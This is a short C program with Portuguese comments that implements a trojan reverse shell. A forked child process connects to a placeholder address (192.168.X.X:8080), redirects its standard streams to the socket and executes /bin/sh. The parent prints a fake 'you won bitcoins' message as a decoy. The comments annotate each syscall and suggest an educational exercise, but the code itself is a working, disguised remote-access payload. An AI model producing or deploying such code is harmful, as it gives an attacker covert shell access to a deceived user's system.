#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    pid_t pid;

    //1º IF: Se der erro na criação do processo filho
    if ((pid = fork()) < 0) {   //syscall -> Criação do processo filho
        perror("fork error");
        return 1;
    
    
    //2º IF (identificador 0): Código do processo filho (Segundo Plano)
    } else if (pid == 0) {      
        int port = 8080; 
        struct sockaddr_in revsockaddr;

        int sockt = socket(AF_INET, SOCK_STREAM, 0);    //syscall -> arquivo de rede
        revsockaddr.sin_family = AF_INET;       
        revsockaddr.sin_port = htons(port);
        
        revsockaddr.sin_addr.s_addr = inet_addr("192.168.X.X"); 

        if (connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr)) < 0) {
            perror("Erro ao conectar ao servidor");
            return 1;
        }   //syscall -> conexão socket 


        dup2(sockt, 0);     //syscall -> redirecionamento (Tabela de Descritor de Arquivo)
        dup2(sockt, 1);
        dup2(sockt, 2);


        char * const argv[] = {"/bin/sh", NULL};
        execve("/bin/sh", argv, NULL);      //syscall -> carrega o shell do linux no processo filho

        return 0; 
        

    //3º (identificador > 0): Código do processo pai (principal)
    } else {
        printf("Parabens! Você ganhou %d bitcoins!\n", getpid());
    }

    return 0;       //Processo filho é adotado pelo SO
}